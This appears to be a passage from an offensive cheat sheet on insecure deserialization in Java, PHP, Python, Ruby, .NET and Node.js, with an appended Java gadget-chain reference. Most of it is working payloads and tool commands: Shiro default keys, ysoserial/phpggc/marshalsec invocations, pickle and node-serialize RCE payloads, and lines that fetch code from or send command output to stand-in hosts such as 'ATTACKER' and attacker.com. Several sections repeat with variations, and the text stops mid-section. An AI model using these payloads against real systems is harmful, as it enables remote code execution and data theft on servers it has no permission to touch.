Known hard-coded keys (SHIRO-550 / CVE-2016-4437):
kPH+bIxk5D2deZiIxcaaaA==          # most common default
wGJlpLanyXlVB1LUUWolBg==          # another common default in older versions
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
```

**Attack flow**:
1. Detect: response sets `rememberMe=deleteMe` cookie on invalid session
2. Generate ysoserial payload (CommonsCollections6 recommended for broad compat)
3. AES-CBC encrypt with known key + random IV
4. Base64-encode → set as `rememberMe` cookie value
5. Send request → server decrypts → deserializes → RCE

**DNSLog confirmation** (before full RCE): use URLDNS chain → `java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn"` → encrypt → set cookie → check DNSLog for hit.

**Post-fix (random key)**: Key may still leak via padding oracle, or another CVE (SHIRO-721).

### WebLogic Deserialization

Multiple vectors:
- **T3 protocol** (port 7001): direct serialized object injection
- **XMLDecoder** (CVE-2017-10271): XML-based deserialization via `/wls-wsat/CoordinatorPortType`
- **IIOP protocol**: alternative to T3

```bash
# T3 probe — check if T3 is exposed:
nmap -sV -p 7001 TARGET
# Look for: "T3" or "WebLogic" in service banner
```

### Java RMI Registry

RMI Registry (port 1099) accepts serialized objects by design:

```bash
# ysoserial exploit module for RMI:
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 "id"

# Requires: vulnerable library on target's classpath
# Works on: JDK <= 8u111 without JEP 290 deserialization filter
```

### JDK Version Constraints

| JDK Version | Impact |
|---|---|
| < 8u121 | RMI/LDAP remote class loading works |
| 8u121-8u190 | `trustURLCodebase=false` for RMI; LDAP still works |
| >= 8u191 | Both RMI and LDAP remote class loading blocked |
| >= 8u191 bypass | Use LDAP → return serialized gadget object (not remote class) |

---

## 3. PHP — unserialize AND PHAR

### Magic Method Chain

PHP deserialization triggers magic methods in order:

```
__wakeup()  → called immediately on unserialize()
__destruct() → called when object is garbage-collected
__toString() → called when object is used as string
__call()     → called for inaccessible methods
```

**Attack**: craft a serialized object whose `__destruct()` or `__wakeup()` triggers dangerous operations (file write, SQL query, command execution, SSRF).

### Serialized Object Format

```php
O:8:"ClassName":2:{s:4:"prop";s:5:"value";s:4:"cmd";s:2:"id";}
// O:LENGTH:"CLASS":PROP_COUNT:{PROPERTIES}
```

### phpMyAdmin Configuration Injection (Real-World Case)

phpMyAdmin `PMA_Config` class reads arbitrary files via `source` property:

```text
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}
```

### PHPGGC — PHP Gadget Chain Generator

```bash
# List available chains:
phpggc -l

# Generate payload (example: Laravel RCE):
phpggc Laravel/RCE1 system id

# Common chains:
# Laravel/RCE1-10
# Symfony/RCE1-4
# Guzzle/RCE1
# Monolog/RCE1-2
# WordPress/RCE1
# Slim/RCE1
```

### Phar Deserialization

Phar archives contain serialized metadata. Any file operation on a `phar://` URI triggers deserialization — even when `unserialize()` is never directly called.

**Triggering functions** (partial list):
```
file_exists()    file_get_contents()    fopen()
is_file()        is_dir()               copy()
filesize()       filetype()             stat()
include()        require()              getimagesize()
```

**Attack flow**:
1. Upload a valid file (e.g., JPEG with phar polyglot)
2. Trigger file operation: `file_exists("phar://uploads/avatar.jpg")`
3. PHP deserializes phar metadata → gadget chain executes

```bash
# Generate phar with PHPGGC:
phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```

---

## 4. PYTHON — PICKLE

### __reduce__ Method

Python's `pickle.loads()` calls `__reduce__()` on objects during deserialization, which can return a callable + args:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
# Send payload to target that calls pickle.loads()
```

### Analyzing Pickle Opcodes

```python
import pickletools
pickletools.dis(payload)
# Shows opcodes: GLOBAL, REDUCE, etc.
# Look for GLOBAL referencing dangerous modules (os, subprocess, builtins)
```

### Common Python Deserialization Sinks

```python
pickle.loads(user_data)
pickle.load(file_handle)
yaml.load(data)           # PyYAML without Loader=SafeLoader
jsonpickle.decode(data)
shelve.open(path)
```

### Defensive Bypass: RestrictedUnpickler

Even when `RestrictedUnpickler.find_class` is used, check if the whitelist is too broad:

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"forbidden: {module}.{name}")
```

If `safe_builtins` includes `eval`, `exec`, or `__import__` → still exploitable.

---

## 5. DETECTION METHODOLOGY

```
Found binary blob or encoded object in request/cookie?
├── Java signature (ac ed / rO0AB)?
│   ├── Use URLDNS probe for safe confirmation
│   ├── Identify libraries (error messages, known product)
│   └── Try ysoserial chains matching identified libraries
│
├── PHP signature (O:N:"...)?
│   ├── Identify framework (Laravel, Symfony, WordPress)
│   ├── Try PHPGGC chains for that framework
│   └── Check for phar:// wrapper in file operations
│
├── Python (opaque binary, base64 blob)?
│   ├── Try pickle payload with DNS callback
│   └── Check if PyYAML unsafe load is used
│
└── Not sure?
    ├── Try URLDNS payload (Java) — check DNS
    ├── Try PHP serialized test string
    └── Monitor error messages for class loading failures
```

---

## 6. DEFENSE AWARENESS

| Language | Mitigation |
|---|---|
| Java | JEP 290 deserialization filters; whitelist allowed classes; avoid `ObjectInputStream` on untrusted data; use JSON/Protobuf instead |
| PHP | Avoid `unserialize()` on user input; use `json_decode()` instead; block `phar://` in file operations |
| Python | Use `pickle` only for trusted data; use `json` for external input; PyYAML: always use `yaml.safe_load()` |

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```text
# Java — URLDNS confirmation
java -jar ysoserial.jar URLDNS "http://TOKEN.collab.net"

# Java — RCE via CommonsCollections
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned"

# PHP — Laravel RCE
phpggc Laravel/RCE1 system "id"

# PHP — Phar polyglot
phpggc -p phar -o exploit.phar Monolog/RCE1 system "id"

# Python — Pickle RCE
python3 -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())"

# Shiro default key test
rememberMe=<AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==, payload=ysoserial_output)>
```

---

## 8. RUBY DESERIALIZATION

### Ruby Marshal

- `Marshal.load` on untrusted data → RCE
- Fingerprint: binary data, no common text header
- Gadget chains exist for various Ruby versions
- Docker verification: hex payload via `[hex_string].pack("H*")`

### Ruby YAML (YAML.load)

- `YAML.load` (not `YAML.safe_load`) executes arbitrary Ruby objects
- **Pre Ruby 2.7.2**: `Gem::Requirement` chain → `git_set: id` / `git_set: sleep 600`
- **Ruby 2.x-3.x**: `Gem::Installer` → `TarReader` → `Kernel#system` chain (longer, multi-step)
- Always test: `YAML.load("--- !ruby/object:Gem::Installer\ni: x")` for class instantiation check
- Payload template:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  type: :runtime
  specs:
    - !ruby/object:Gem::StubSpecification
      loaded_from: "|id"
```

- Note: `YAML.safe_load` is safe (Ruby 2.1+); `Psych.safe_load` also safe

---

## 9. .NET DESERIALIZATION

- **Traffic fingerprint**:
  - BinaryFormatter: hex `AAEAAD` (base64 `AAEAAAD/////`)
  - ViewState: hex `FF01` or `/w` prefix
  - JSON.NET: `$type` property in JSON
- **BinaryFormatter** (most dangerous, deprecated in .NET 5+): arbitrary type instantiation
- **XmlSerializer**: `ObjectDataProvider` + `XamlReader` chain for command execution

  ```xml
  <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:od="http://schemas.microsoft.com/powershell/2004/04" type="System.Windows.Data.ObjectDataProvider">
    <od:MethodName>Start</od:MethodName>
    <od:MethodParameters><sys:String>cmd</sys:String><sys:String>/c calc</sys:String></od:MethodParameters>
    <od:ObjectInstance xsi:type="System.Diagnostics.Process"/>
  </root>
  ```

- **NetDataContractSerializer**: similar to BinaryFormatter, full type info in XML
- **LosFormatter**: used in ViewState, deserializes to `ObjectStateFormatter`
- **JSON.NET**: `$type` property enables type control → `ObjectDataProvider` + `ExpandedWrapper` chains

  ```json
  {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
  ```

- **Tool**: `ysoserial.net` — generate payloads for all .NET formatters

  ```text
  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
  ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc"
  ```

- **POP gadgets**: `ObjectDataProvider`, `ExpandedWrapper`, `AssemblyInstaller.set_Path`

---

## 10. NODE.JS DESERIALIZATION

- **node-serialize**: `unserialize()` with IIFE (Immediately Invoked Function Expression)
  - Payload marker: `_$$ND_FUNC$$_`
  - Add `()` at end to auto-execute:

  ```json
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('COMMAND')}()"}
  ```

- **funcster**: `__js_function` property → `constructor.constructor` to access `process`

  ```json
  {"__js_function":"function(){return global.process.mainModule.require('child_process').execSync('id').toString()}"}
  ```

- **cryo**: similar to funcster, serializes JS objects with function support

---

## RUBY DESERIALIZATION

### Marshal (Binary Format)
```ruby
# Ruby's Marshal.load is equivalent to Java's ObjectInputStream
# Any class with marshal_dump/marshal_load can be a gadget

# Detection: binary data starting with \x04\x08
# Or hex: 0408

# PoC gadget (requires vulnerable class in scope):
payload = "\x04\x08..." # hex-encoded gadget chain
Marshal.load(payload)    # triggers arbitrary code execution
```

### YAML.load (Critical — Most Common Ruby Deser Sink)
```ruby
# YAML.load (NOT YAML.safe_load) deserializes arbitrary Ruby objects

# Ruby <= 2.7.2 — Gem::Requirement chain:
# Triggers via !ruby/object constructor
---
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| id"

# Ruby 2.x–3.x — Gem::Installer chain:
# Uses Gem::Installer → Gem::StubSpecification → Kernel#system
---
!ruby/hash:Gem::Installer
i: x
!ruby/hash:Gem::SpecFetcher
i: y
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: id    # <-- command to execute
      method_id: :resolve

# Safe alternative: YAML.safe_load (whitelist of allowed types)
```

### Tools
- `elttam/ruby-deserialization` — Ruby gadget chain generator
- `frohoff/ysoserial` inspiration → check Ruby-specific forks

---

## .NET DESERIALIZATION

### Traffic Fingerprinting

| Indicator | Serializer |
|---|---|
| Hex `00 01 00 00 00` / Base64 `AAEAAD` | BinaryFormatter |
| Hex `FF 01` / Base64 `/w` | DataContractSerializer |
| ViewState starts with `__VIEWSTATE` | LosFormatter / ObjectStateFormatter |
| JSON with `$type` property | JSON.NET (Newtonsoft) TypeNameHandling |
| XML with `<ObjectDataProvider>` | XmlSerializer / NetDataContractSerializer |

### BinaryFormatter / LosFormatter
```
# Most dangerous — arbitrary type instantiation
# Tool: ysoserial.net

ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c whoami > C:\\out.txt" -o base64

# LosFormatter wraps BinaryFormatter — same gadgets work
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "calc.exe" -o base64
```

### XmlSerializer + ObjectDataProvider
```xml
<root>
  <ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
    <ObjectDataProvider.MethodParameters>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">cmd.exe</sys:String>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">/c whoami</sys:String>
    </ObjectDataProvider.MethodParameters>
    <ObjectDataProvider.ObjectInstance>
      <ProcessStartInfo xmlns="clr-namespace:System.Diagnostics;assembly=System">
        <ProcessStartInfo.FileName>cmd.exe</ProcessStartInfo.FileName>
        <ProcessStartInfo.Arguments>/c whoami</ProcessStartInfo.Arguments>
      </ProcessStartInfo>
    </ObjectDataProvider.ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET with TypeNameHandling
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```
Vulnerable when `TypeNameHandling` is set to `Auto`, `Objects`, `Arrays`, or `All`.

### Tools
- `pwntester/ysoserial.net` — primary .NET deserialization payload generator
- Gadget chains: TypeConfuseDelegate, TextFormattingRunProperties, PSObject, ActivitySurrogateSelectorFromFile

---

## NODE.JS DESERIALIZATION

### node-serialize (IIFE Pattern)
```javascript
// node-serialize uses eval() internally
// Payload uses _$$ND_FUNC$$_ marker + IIFE:

var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}';

// The trailing () makes it an Immediately Invoked Function Expression
// When unserialize() processes this, it executes the function

// Full HTTP exploit (in cookie or body):
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://ATTACKER/?x=$(id|base64)',function(e,o,s){});}()","email":"test@test.com"}
```

### funcster
```javascript
// funcster deserializes functions via constructor.constructor pattern:
{"__js_function":"function(){var net=this.constructor.constructor('return require')()('child_process');return net.execSync('id').toString();}"}
```

### PHP create_function + Deserialization Combo
```php
// When a PHP class uses create_function in __destruct or __wakeup:
// Serialize an object where:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function(){ ;}system('id');/* }
// Closing the original function body and injecting a command

// In serialized form, private properties need \0ClassName\0 prefix:
O:7:"Noteasy":2:{s:19:"\0Noteasy\0method_name";s:15:"create_function";s:14:"\0Noteasy\0args";s:21:";}system('id');/*";}
```

---

## 11. RUBY DESERIALIZATION

### Marshal
```ruby
# Ruby's native serialization. Dangerous when deserializing untrusted data.
# Detection: Binary data starting with \x04\x08

# One-liner gadget verification (hex-encoded payload):
payload = ["040802"].pack("H*")  # Minimal Marshal header
Marshal.load(payload)
```

### YAML (CVE-rich surface)
```ruby
# YAML.load is DANGEROUS — equivalent to eval for Ruby objects
# Safe alternative: YAML.safe_load

# Ruby <= 2.7.2: Gem::Requirement chain
--- !ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Gem::DependencyList
    specs:
    - !ruby/object:Gem::Source
      uri: "| id"

# Ruby 2.x-3.x: Gem::Installer chain (more complex)
# Triggers: git_set → Kernel#system
--- !ruby/object:Gem::Installer
i: x
# (Full chain available in ysoserial-ruby / blind-ruby-deserialization)

# Universal detection: supply YAML that triggers DNS callback
--- !ruby/object:Gem::Fetcher
uri: http://BURP_COLLAB/
```

**Tools**: `elttam/ruby-deserialization`, `mbechler/ysoserial` (Ruby variant)

---

## 12. .NET DESERIALIZATION

### Fingerprinting
| Magic Bytes | Format |
|---|---|
| `AAEAAD` (base64) / `00 01 00 00 00` (hex) | BinaryFormatter |
| `FF 01` or `/w` (base64) | ViewState (ObjectStateFormatter) |
| `<` (XML opening) | XmlSerializer / DataContractSerializer |
| JSON with `$type` key | JSON.NET (TypeNameHandling enabled) |

### BinaryFormatter (most dangerous)
```
# Always dangerous when deserializing untrusted data
# Tool: ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami" -o base64
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "calc" -o raw
```

### ViewState (ASP.NET)
```
# If __VIEWSTATE is not MAC-protected (enableViewStateMac=false):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg="SHA1" --validationkey="KNOWN_KEY"

# Leak machineKey from web.config (via LFI/backup) → forge ViewState
```

### XmlSerializer + ObjectDataProvider
```xml
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
      xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ObjectDataProvider MethodName="Start">
    <ObjectInstance xsi:type="Process">
      <StartInfo>
        <FileName>cmd.exe</FileName>
        <Arguments>/c whoami</Arguments>
      </StartInfo>
    </ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET ($type abuse)
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c whoami"
    }
  }
}
```
Vulnerable when `TypeNameHandling != None` in JSON deserialization settings.

### Tools
- `pwntester/ysoserial.net` — primary .NET gadget chain generator
- `NotSoSecure/Blacklist3r` — decrypt/forge ViewState with known machineKey

---

## 13. NODE.JS DESERIALIZATION

### node-serialize (IIFE injection)
```javascript
// Vulnerable pattern:
var serialize = require('node-serialize');
var obj = serialize.unserialize(userInput);

// Payload: IIFE (Immediately Invoked Function Expression)
// The _$$ND_FUNC$$_ prefix signals a serialized function
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"}

// Key: the () at the end causes immediate execution upon deserialization
```

### funcster
```javascript
// Vulnerable: funcster.deepDeserialize(userInput)
// Payload uses __js_function to inject via constructor chain:
{"__js_function":"function(){var net=this.constructor.constructor('return this')().process.mainModule.require('child_process');return net.execSync('id').toString()}()"}
```

### PHP create_function + Deserialization Combo
```php
// When create_function is available and object is deserialized:
// Payload creates lambda with injected code:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function anonymous() { ;}system('id');/* }
// Effective: close original body, inject command, comment out rest

// In serialized form (with private property \0ClassName\0):
O:8:"ClassName":2:{s:13:"\0ClassName\0func";s:15:"create_function";s:12:"\0ClassName\0arg";s:18:";}system('id');/*";}
```


---


## 附件：JAVA_GADGET_CHAINS

# Java Gadget Chains & Cross-Language Deserialization Deep Dive


## 1. JAVA GADGET CHAIN VERSION COMPATIBILITY MATRIX

### 1.1 CommonsCollections Chains

| Chain | Library | Version Range | JDK Constraint | Execution Type |
|---|---|---|---|---|
| **CC1** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 (InvokerTransformer filter) | `Runtime.exec()` |
| **CC2** | Commons Collections 4.x | 4.0 | None (uses `TemplatesImpl`) | Bytecode execution |
| **CC3** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 | `TemplatesImpl` (bytecode) |
| **CC4** | Commons Collections 4.x | 4.0 | None | `TemplatesImpl` |
| **CC5** | Commons Collections 3.x | 3.0–3.2.1 | JDK ≥ 8 OK (no `InvokerTransformer` check needed) | `Runtime.exec()` via `TiedMapEntry` |
| **CC6** | Commons Collections 3.x | 3.1–3.2.1 | All JDK versions | `Runtime.exec()` via `HashSet` trigger |
| **CC7** | Commons Collections 3.x | 3.1–3.2.1 | All JDK versions | `Runtime.exec()` via `Hashtable` |

**Recommended priority**: CC6 → CC7 → CC5 (broadest compatibility, no JDK version constraint).

### 1.2 CommonsBeanutils Chains

| Chain | Library | Version Range | Notes |
|---|---|---|---|
| **CB1** | Commons BeanUtils 1.x + Commons Collections 3.x | BU 1.6.1–1.9.4, CC ≤ 3.2.1 | `PropertyUtils.getProperty` → `TemplatesImpl` |
| **CB1 (no-CC)** | Commons BeanUtils 1.x only | BU 1.8.3–1.9.4 | Requires `commons-logging`; no CC dependency |

### 1.3 Spring Framework Chains

| Chain | Library | Version Range | Notes |
|---|---|---|---|
| **Spring1** | Spring Core + Spring Beans | 4.1.4 (known), varies | `MethodInvokeTypeProvider` → `TemplatesImpl` |
| **Spring2** | Spring Core | 4.1.4 | `ObjectFactoryDelegatingInvocationHandler` |

### 1.4 JDK-Only Chains (No External Dependencies)

| Chain | JDK Version | Notes |
|---|---|---|
| **Jdk7u21** | JDK 7u21 | `AnnotationInvocationHandler` + `TemplatesImpl`; patched in 7u25 |
| **JRMPClient** | All | Triggers JRMP call to attacker RMI server (not direct RCE, but enables chaining) |
| **JRMPListener** | All | Opens RMI listener on victim (less useful) |
| **URLDNS** | All | DNS-only; confirmation probe, no RCE |

### 1.5 Other Notable Chains

| Chain | Library | Notes |
|---|---|---|
| **Groovy1** | Groovy 1.7–2.4 | `MethodClosure` + `ConvertedClosure` |
| **Hibernate1** | Hibernate 5.x (with `javassist` or `cglib`) | `BasicLazyInitializer` → `TemplatesImpl` |
| **Hibernate2** | Hibernate 5.x | Via `AbstractComponentTuplizer` |
| **JBossInterceptors1** | JBoss Interceptors + weld-core | Rarely seen in modern apps |
| **Myfaces1** | Apache MyFaces 1.x | `ViewState` deserialization |
| **Myfaces2** | Apache MyFaces 2.x | `ViewState` deserialization |
| **ROME** | ROME 1.0 | `ObjectBean` → `EqualsBean` → `ToStringBean` |
| **Vaadin1** | Vaadin framework | `PropertysetItem` chain |
| **Wicket1** | Apache Wicket | Requires specific classpath setup |
| **C3P0** | C3P0 connection pool | `PoolBackedDataSource` → JNDI or URL classloading |
| **Clojure** | Clojure runtime | `core$fn` → arbitrary function execution |
| **BeanShell1** | BeanShell 2.x | `XThis` + `Interpreter.eval()` |
| **Jython1** | Jython | `PyFunction` → arbitrary Python execution in JVM |
| **MozillaRhino1/2** | Mozilla Rhino JS engine | `NativeJavaObject` chains |

### 1.6 Chain Selection Decision Tree

```
Identify target libraries (error messages, pom.xml, /META-INF/MANIFEST.MF):
├── Commons Collections 3.x on classpath?
│   ├── JDK < 8u72 → CC1, CC3
│   └── JDK ≥ 8u72 → CC5, CC6, CC7
├── Commons Collections 4.x?
│   └── CC2, CC4
├── Commons BeanUtils?
│   └── CB1 (with or without CC)
├── Spring Framework?
│   └── Spring1, Spring2
├── Groovy?
│   └── Groovy1
├── Hibernate + javassist/cglib?
│   └── Hibernate1, Hibernate2
├── No external libs identified?
│   ├── Try URLDNS first (confirmation)
│   ├── JDK 7u21 → Jdk7u21
│   └── JRMPClient → chain to RMI server with full gadget
└── Unknown? Try CC6, then CB1, then URLDNS
```

---

## 2. SNAKEYAML GADGET

### 2.1 Concept

SnakeYAML (Java YAML parser) supports constructing arbitrary Java objects via `!!` tag. When `Yaml.load()` is called on untrusted input without `SafeConstructor`, it instantiates any class.

### 2.2 ScriptEngineManager / URLClassLoader

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
```

**Exploit flow**:
1. SnakeYAML constructs `URLClassLoader` pointing to attacker JAR
2. Constructs `ScriptEngineManager` using that classloader
3. `ScriptEngineManager` uses `ServiceLoader` → loads `META-INF/services/javax.script.ScriptEngineFactory`
4. Attacker's JAR contains malicious `ScriptEngineFactory` implementation → RCE

**Attacker JAR structure**:
```
exploit.jar/
├── META-INF/
│   └── services/
│       └── javax.script.ScriptEngineFactory → "Exploit"
└── Exploit.class  (implements ScriptEngineFactory, executes commands in static block)
```

### 2.3 SPI-Based Variants

```yaml
# ProcessBuilder (direct command execution, Java 9+):
!!sun.misc.Service [
  !!java.lang.ProcessBuilder [["curl", "http://attacker.com/pwned"]]
]

# Alternative URLClassLoader form:
!!java.beans.XMLDecoder
  <java>
    <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec"><string>calc</string></void>
    </object>
  </java>
```

### 2.4 Detection

```
# Indicators in HTTP traffic:
- Content-Type: application/x-yaml
- Content-Type: text/yaml
- YAML content with !! tags in POST body, file uploads, config endpoints
- Spring Cloud Config Server endpoints accepting YAML

# Test probe (DNS-based safe detection):
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://UNIQUE.burpcollaborator.net/probe"]
  ]]
]
```

---

## 3. HESSIAN / KRYO / AVRO DESERIALIZATION

### 3.1 Hessian

Caucho Hessian is a binary web-service protocol. Hessian's `HessianInput.readObject()` can deserialize arbitrary Java objects.

```
# Traffic fingerprint:
- Content-Type: x-application/hessian
- Content-Type: application/x-hessian
- Binary starting with: 'c' (call), 'H' (Hessian 2.0), 'r' (reply)
- URL patterns: /hessian, /remoting/*, /service/*

# Known vulnerable configurations:
- Spring Remoting with HessianServiceExporter
- Resin application server (Caucho)
- Dubbo RPC framework (Apache)
```

**Hessian gadget chains** (via `marshalsec` tool):

```bash
# Generate Hessian payload:
java -cp marshalsec.jar marshalsec.Hessian \
  SpringPartiallyComparableAdvisorHolder \
  "ldap://attacker.com:1389/Exploit"

# Hessian2 variant:
java -cp marshalsec.jar marshalsec.Hessian2 \
  SpringAbstractBeanFactoryPointcutAdvisor \
  "ldap://attacker.com:1389/Exploit"
```

**Common Hessian gadgets**:
- `SpringPartiallyComparableAdvisorHolder` → JNDI lookup
- `SpringAbstractBeanFactoryPointcutAdvisor` → JNDI lookup
- `Rome` → `EqualsBean` → `ToStringBean` → JNDI or `TemplatesImpl`
- `Resin` → `QName` → classloading

### 3.2 Kryo

Kryo is a fast Java serialization framework (often used in Spark, Storm, Akka).

```
# Traffic fingerprint:
- Binary format, no standard magic bytes
- Often in message queues (Kafka, RabbitMQ) rather than HTTP
- Configuration key: kryo.setRegistrationRequired(false) → vulnerable

# Exploit approach:
# If registration is NOT required, any class can be deserialized
# Use standard Java gadgets (CC chains work if on classpath)

# If registration IS required but includes dangerous classes:
# Look for: java.net.URL, javax.management.*, java.lang.ProcessBuilder
```

### 3.3 Apache Avro

```
# Traffic fingerprint:
- Content-Type: avro/binary, application/avro
- Uses schema registry in many deployments
- Binary format with schema-defined structure

# Avro deserialization is schema-bound (generally safer)
# BUT: Avro's Java reflection API can be abused if:
# - Schema specifies "java-class" property
# - Custom deserializers are registered
# - GenericDatumReader with ReflectDatumReader
```

### 3.4 XStream

```
# Traffic fingerprint:
- XML with <sorted-set>, <dynamic-proxy>, <tree-map> elements
- Often used in Jenkins, Bamboo, TeamCity

# Payload (pre-1.4.7):
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>calc</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>

# Tool: marshalsec supports XStream payloads
java -cp marshalsec.jar marshalsec.XStream ImageIO "calc"
```

---

## 4. .NET VIEWSTATE DESERIALIZATION

### 4.1 ViewState Structure

```
__VIEWSTATE is a hidden form field in ASP.NET WebForms:
<input type="hidden" name="__VIEWSTATE" value="BASE64_ENCODED_DATA" />

Structure (after base64 decode):
- Serialized object graph (LosFormatter → ObjectStateFormatter → BinaryFormatter)
- Optional MAC (message authentication code) — HMAC-SHA1/SHA256
- Optional encryption — AES
```

### 4.2 machineKey Requirement

ViewState MAC/encryption uses keys from `web.config`:

```xml
<machineKey
  validationKey="HEXKEY_FOR_MAC"
  decryptionKey="HEXKEY_FOR_ENCRYPTION"
  validation="SHA1"
  decryption="AES" />
```

**How to obtain machineKey**:
1. LFI/path traversal → read `web.config`
2. Information disclosure (error pages, debug endpoints)
3. Known default keys in specific products (SharePoint, DotNetNuke)
4. `.config` backup files left on server
5. Azure App Service: sometimes in `WEBSITE_AUTH_ENCRYPTION_KEY` env var

### 4.3 ViewState Forgery

```bash
# With known machineKey — generate malicious ViewState:
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc BASE64_PAYLOAD" \
  --path="/target-page.aspx" \
  --apppath="/" \
  --decryptionalg="AES" \
  --decryptionkey="DECRYPTION_KEY_HEX" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX" \
  --islegacy

# Without encryption (enableViewStateMac=false or older .NET):
ysoserial.exe -p ViewState \
  -g TypeConfuseDelegate \
  -c "cmd /c whoami > C:\out.txt" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX"
```

### 4.4 ViewState Attacks Without machineKey

```
# .NET Framework < 4.5 with enableViewStateMac="false" in web.config:
# No MAC → directly craft malicious ViewState

# Blacklist3r tool: try known/default keys:
Blacklist3r.exe --viewstate "BASE64_VIEWSTATE" --path "/page.aspx" --apppath "/"
# Tests common validation/decryption key pairs

# ASP.NET __VIEWSTATEGENERATOR value:
# Helps identify the target page's ViewState key derivation
# Format: 8 hex chars in hidden field
```

### 4.5 JSON.NET TypeNameHandling Exploitation

```json
// Vulnerable configuration:
// JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings {
//     TypeNameHandling = TypeNameHandling.All  // or Auto, Objects, Arrays
// });

// Payload — ObjectDataProvider chain:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}

// Alternative: System.Configuration.Install.AssemblyInstaller
// Triggers assembly load from attacker-controlled path
{
  "$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
  "Path": "\\\\attacker.com\\share\\payload.dll"
}
```

---

## 5. RUBY YAML.load vs YAML.safe_load

### 5.1 Why YAML.load Is Dangerous

